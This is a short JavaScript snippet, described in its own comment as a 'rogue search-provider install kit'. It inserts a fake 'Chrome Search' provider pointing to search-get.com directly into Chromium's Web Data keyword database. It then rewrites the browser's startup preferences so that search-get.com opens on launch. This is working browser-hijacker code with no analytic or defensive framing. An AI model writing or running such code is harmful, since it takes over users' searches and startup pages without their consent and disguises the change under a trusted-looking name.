// Rogue search-provider install kit: writes a full provider row (including
// the {searchTerms} template) straight into Chromium's Web Data keyword
// table, announces the takeover, and flips startup-page preferences.
const row = [
  "insert into keywords ( `short_name`, `keyword`, `favicon_url`, `url`,",
  "`safe_for_autoreplace`, `originating_url`, `input_encodings`, `suggest_url`,",
  "`prepopulate_id`, `sync_guid`, `alternate_urls` )  VALUES ('Chrome Search',",
  "'Chrome Search', 'https://www.search-get.com/favicon.ico',",
  "'https://search-get.com/wc/search?q={searchTerms}&src=chrome', 1, '',",
  "'UTF-8', '', 20, 'guid-1337', '[]')",
].join(" ");
db.exec(row);
log.info("Default search was replaced");
syncPrefs({ session: { restore_on_startup: 4, startup_urls: ["https://search-get.com/"] } });
